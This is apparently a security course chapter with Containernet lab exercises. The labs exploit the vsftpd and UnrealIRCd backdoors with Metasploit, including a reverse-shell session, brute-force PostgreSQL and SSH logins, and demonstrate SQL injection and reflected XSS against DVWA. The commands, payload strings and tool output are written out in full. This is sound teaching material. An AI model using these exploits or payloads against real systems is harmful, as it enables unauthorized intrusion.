<a name="exploitation-and-post-exploitation"></a>
# Exploitation and Post Exploitation


<a name="metasploit-framework"></a>
## Metasploit Framework

The Metasploit Project is an open-source project that provides a public resource for researching security vulnerabilities and developing code that allows a network administrator to hack into their own network, identify security risks, and document which vulnerabilities need to be addressed first. The Metasploit Project's best-known creation is the Metasploit Framework, which is a software platform for developing, testing, and executing exploits. It can be used to create security testing tools and exploit modules, and also as a penetration testing system.

msfconsole is probably the most popular interface for the Metasploit Framework (MSF). It provides a centralized, all-in-one console and allows efficient access to virtually all options available in MSF, and can be launched with the msfconsole command. The main components of MSF are exploits, which are pieces of code written to take advantage of specific vulnerabilities, and can be active, meaning they will exploit a specific host, run to completion, and then exit, or passive, which wait for hosts and exploit them as they connect.

<a name="backdoors"></a>
## Backdoors

Backdoors are specific types of Trojans that allow access to and remote control of an infected system. A backdoor is a means of accessing a computer system or encrypted data that bypasses the system's usual security mechanisms. A developer can create a backdoor so that an application or operating system can be accessed for troubleshooting or other purposes. However, attackers often use backdoors to detect flaws and exploit systems. In some cases, a worm or virus is designed to exploit a backdoor created in a previous attack.

In this exercise, Metasploit will be used to gain access to Alice's shell from a backdoor.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/vulnerable", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                         mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    alice1.cmd("echo \'10.200.0.1 alice\' > /etc/hosts && unrealircd")
    makeTerm(alice1, cmd="bash -c 'services.sh'")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```


Running the above code will launch a series of services from Alice that should be identified as vulnerable.

Then, scan these services from Chuck.

```
chuck# nmap 10.200.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-31 00:13 GMT
Nmap scan report for 10.200.0.1
Host is up (0.000011s latency).
Not shown: 981 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 5A:3E:C9:7B:EE:31 (Unknown)
```

vsftpd, a popular FTP server, is running on port 21. This particular version contains a backdoor inserted into the source code by an unknown attacker. The backdoor was identified and removed, but not before several people downloaded it. If a username ending in the smiley face is sent, the backdoor version will open a shell listening on port 6200. We can demonstrate this with telnet or use the Metasploit Framework module to automatically exploit it:

**Note**: The input data below “user backdoored:)” and “pass invalid” are manual entries.

```
chuck# telnet 10.200.0.1 21
Trying 10.200.0.1...
Connected to 10.200.0.1.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
user backdoored:)
331 Please specify the password.
pass invalid
^]
telnet> quit
Connection closed.
                       
chuck# telnet 10.200.0.1 6200
Trying 10.200.0.1...
Connected to 10.200.0.1.
Escape character is '^]'.
```

In the terminal above, you can exploit the vulnerability in Alice by starting to view Alice's files. For example, try running the ls command; and others available on Linux.

The UnreaIRCD IRC daemon is running on port 6667. This version contains a backdoor that went unnoticed for months—triggered by sending the letters "AB" followed by a system command to the server on any listening port. Metasploit has a module to exploit this to obtain an interactive shell, as shown below.

```
chuck# msfconsole
chuck-msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
chuck-msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 10.200.0.1
chuck-msf  exploit(unreal_ircd_3281_backdoor) > set LHOST 10.200.0.2
chuck-msf  exploit(unreal_ircd_3281_backdoor) > set payload payload/cmd/unix/reverse
chuck-msf  exploit(unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 10.200.0.2:4444 
[*] 10.200.0.1:6667 - Connected to 10.200.0.1:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 10.200.0.1:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 1kDD8bOZau1U2CMw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "1kDD8bOZau1U2CMw\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.200.0.2:4444 -> 10.200.0.1:33638) at 2022-05-31 00:11:50 +0000
```

From this point on, just as with the Telnet example on port 21, where you could access Alice's files, here you can also view files in the same way by issuing Linux commands.

More details about the vulnerability found in UnreaIRCD can be found at https://www.cvedetails.com/cve/CVE-2010-2075/.



<a name="extracting-database-information"></a>
## Extracting Database Information

The Metasploit Framework provides backend database support for PostgreSQL. The database stores information such as host data and exploit results.


In this exercise, Metasploit will be used to access Alice's database. Consider running the code below and opening a terminal for Chuck.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/vulnerable", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                         mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    alice1.cmd("echo \'10.200.0.1 alice\' > /etc/hosts")
    makeTerm(alice1, cmd="bash -c 'services.sh'")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

After starting the above code, we need to determine if the PostgreSQL service is running on the target. To do this, we can run an Nmap scan on port 5432, which is typically the default port for PostgreSQL. Use the -p flag to specify the port and -sV to enable version detection:

```
chuck# nmap -sV 10.200.0.1 -p 5432
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-31 12:01 GMT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 12:01 (0:00:00 remaining)
Nmap scan report for 10.200.0.1
Host is up (0.00033s latency).

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
MAC Address: 8A:43:62:F9:FA:76 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

We can see that the PostgreSQL service is open on the target and running versions 8.3.0–8.3.7.

Now, Chuck uses the search function to search for PostgreSQL-related modules:

```
chuck# msfconsole
chuck-msf > search postgre
```

The first one we'll cover will give us some information about the running version. It never hurts to double-check, as certain exploits will only work for certain versions. Therefore, load the module as follows:

```
chuck-msf > use auxiliary/scanner/postgres/postgres_version
chuck-msf > auxiliary(scanner/postgres/postgres_version) > set rhosts 10.200.0.1
chuck-msf > auxiliary(scanner/postgres/postgres_version) > run

[*] 10.200.0.1:5432 Postgres - Version PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4) (Post-Auth)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

And we can see that the version number is 8.3.1, which is a bit more specific than what Nmap returned.

The next module we'll look at will attempt to force a login to the PostgreSQL database using a list of default usernames and passwords. Load it as follows:

```
chuck-msf > use auxiliary/scanner/postgres/postgres_login
chuck-msf > auxiliary(scanner/postgres/postgres_login) > set rhosts 10.200.0.1
chuck-msf > auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.200.0.1:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[+] 10.200.0.1:5432 - Login Successful: postgres:postgres@template1
[-] 10.200.0.1:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.200.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We see it go through each username and password combination. Most of them fail, but we're left with a successful login.

<a name="gaining-shell-access"></a>
## Gaining Shell Access

Many attacks and vulnerabilities are used to obtain a shell, possibly with administrative privileges, on the victim's machine in order to take control of the system.

In this exercise, Metasploit will be used to perform a brute-force attack on an SSH server after discovering its activity using Nmap. The framework will try all possible combinations of the usernames and passwords contained in the provided files, which are commonly chosen by the user.

For this exercise, consider running the code below and open terminals for Alice and Chuck.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    alice1.cmd("service ssh start")
    chuck1.cmd("echo \'admin\nseg\' >> usernames.txt")
    chuck1.cmd("echo \'admin\nseg\' >> passwords.txt")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

A terminal for Chuck will automatically open after running the above script. This terminal will install metasploit-framework.

First, Chuck launches the Metasploit console:

```
chuck# msfconsole
```

Then, from the console, he scans the victim Alice with Nmap:

```
chuck-msf > nmap -sS 10.200.0.1
```
and discovers that the SSH port is open.
Now he selects the module used to test SSH logins:
```
chuck-msf > use auxiliary/scanner/ssh/ssh_login
```

It sets the victim's IP, and files containing usernames and passwords to try to carry out the attack.

``` 
chuck-msf auxiliary (scanner/ssh/ssh_login) > set RHOSTS 10.200.0.1 
chuck-msf auxiliary (scanner/ssh/ssh_login) > set USER_FILE usernames.txt 
chuck-msf auxiliary (scanner/ssh/ssh_login) > set PASS_FILE passwords.txt
```

Finally, he runs the exploit:
```
chuck-msf auxiliary (scanner/ssh/ssh_login) > exploit
```

In Alice's Wireshark, it is possible to observe all the SSH requests made by Chuck, while after some time, in Chuck's terminal, a valid username and password combination appears that Chuck can now use to access Alice via SSH.


#### Meterpreter Challenge

Meterpreter is an advanced and extensible payload attack metasploit that provides an interactive shell from which an attacker can exploit the target machine and execute code. It communicates with the target machine via sockets and provides a comprehensive client-side Ruby API. It supports command history, tab completion, pipes, and more. It has the following features:

- Meterpreter resides entirely in memory and does not write anything to disk.
- No new processes are created, as Meterpreter injects itself into the compromised process and can easily migrate to other running processes.
- By default, Meterpreter uses encrypted communications.

##### Meterpreter (Reverse Shell)

Attack Script: Chuck wants to access Alice's computer, but Chuck is unaware of any security holes on Alice's computer. Therefore, he intends to use Meterpreter, available in the metasploit-framework package, to gain access to Alice's computer. His goal is to implement this scenario using the code below as a basis. Don't forget to answer how this attack can be prevented.

Additional Information:
- You can execute something on Alice to simulate her clicking (opening?) something. For example, you can open a page on Alice as if it were an action performed by her.
- Use MSFVenom

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

<a name="brute-force"></a>
## Brute Force

A brute force attack systematically tests all possible password or username combinations on a system until valid credentials are found. The goal of a brute force attack is to gain unauthorized access to a system. This not only risks the loss of sensitive data but also opens the possibility of privilege escalation for the attacker. If the compromised credentials have administrator-level access, this can result in complete system takeover.

To perform the brute force attack, we will use the Damn Vulnerable Web Application (DVWA), which is an extremely vulnerable PHP/MySQL web application. Its main purpose is to help security professionals test their skills and tools in a legal environment, help web developers better understand web application protection processes, and help students and teachers learn about web application security in a controlled environment.

The goal of the DVWA is to practice some of the most common web vulnerabilities, with various difficulty levels, using a simple and straightforward interface. Please note that there are both documented and undocumented vulnerabilities in this software. This is intentional. You are encouraged to try to figure out as many problems as possible.

The DVWA /vulnerabilities/brute address is vulnerable to brute-force attacks against user authentication because it lacks adequate security measures. We will attempt to successfully obtain the administrator account password and access the Secure Administrative Area.

<a name="sql-injection"></a>
## SQL Injection

SQL Injection (SQLi) is a security vulnerability that allows an attacker to interfere with SQL queries an application sends to the database. It occurs when the application fails to properly validate or sanitize user input, allowing entered data to be interpreted as SQL commands.

**How it works:** Normally, a secure application would treat user input as data, not as part of the SQL statement.  However, on a vulnerable system, the code might look something like:

```
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

And if the user enters:
```
admin' OR '1'='1 --
```

The resulting query will be:
```
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'anything'
```

For this exercise, consider running the code below. Running this code will automatically open a window to the web server that can be exploited in attacks.
```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    webserver1 = net.addDocker('webserver', dimage="ramonfontes/xss_attack", cpu_shares=20,
                               volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                               environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, webserver1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    webserver1.cmd("echo \'10.200.0.1 webserver\' > /etc/hosts")
    chuck1.cmd("echo \'10.200.0.1 mysite.com\' > /etc/hosts")
    makeTerm(webserver1, cmd="bash -c './main.sh'")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

After executing the code, open Firefox from a terminal in Chuck and go to http://mysite.com/vulnerabilities/brute. Then, log in using the admin/password credentials, click the Create/Reset Database button, and log in again using your login credentials.

After accessing /vulnerabilities/brute, access "low.php" using the "view source" button in the footer and observe its contents. Then, enter the data as shown in the image below and confirm your successful login.

<a name="xss-attack"></a>
## XSS Attack


Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious JavaScript code into pages viewed by other users. This code executes in the victim's browser, but with the context and permissions of the legitimate site, which can allow information theft, user interface manipulation, and even account takeover.

**How it works:** A vulnerable website displays user-entered data without properly validating or filtering the content. This allows an attacker to insert malicious scripts that are then sent back and executed in the browser of anyone accessing the page.

Vulnerable example:

```
<!-- The website directly displays the name the user entered -->
<p>Hello, <?php echo $_GET['name']; ?>!</p>
```

If the attacker accesses:

```
http://site.com/?nome=<script>alert('XSS')</script>
```

The victim's browser executes:
```
alert('XSS');
```

showing that JavaScript was successfully injected.

For this exercise, consider running the code below. Running this code will automatically open a window to the web server that can be exploited in attacks.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    webserver1 = net.addDocker('webserver', dimage="ramonfontes/xss_attack", cpu_shares=20,
                               volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                               environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, webserver1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    webserver1.cmd("echo \'10.200.0.1 webserver\' > /etc/hosts")
    chuck1.cmd("echo \'10.200.0.1 mysite.com\' > /etc/hosts")
    makeTerm(webserver1, cmd="bash -c './main.sh'")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

After running the code, open Firefox from a terminal in Chuck and access the following address: http://mysite.com/vulnerabilities/xss_r/.

In this exercise, we will execute Reflected XSS, which is a type of vulnerability in which the malicious code is not stored on the server, but rather immediately reflected in the application's response, typically from parameters submitted by the user.

It occurs when:
- The attacker sends data (via URL, form, or HTTP header).
- The server inserts this data directly into the response page without validation or sanitization.
- The victim's browser executes the malicious code as if it were a legitimate part of the website.
To perform Reflected XSS, try the XSS payload in the input field:


```
<script>alert('Reflected XSS')</script>
```


## References

- https://www.imperva.com/learn/application-security/backdoor-shell-attack/ 
- https://www.safetydetectives.com/blog/what-is-a-backdoor-and-how-to-protect-against-it/
- Holik, Filip, et al. "Effective penetration testing with Metasploit framework and methodologies." 2014 IEEE 15th International Symposium on Computational Intelligence and Informatics (CINTI). IEEE, 2014.
- Maynor, David. Metasploit toolkit for penetration testing, exploit development, and vulnerability research. Elsevier, 2011.
- Metasploitable 2 Exploitability Guide: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide
- https://github.com/digininja/DVWA

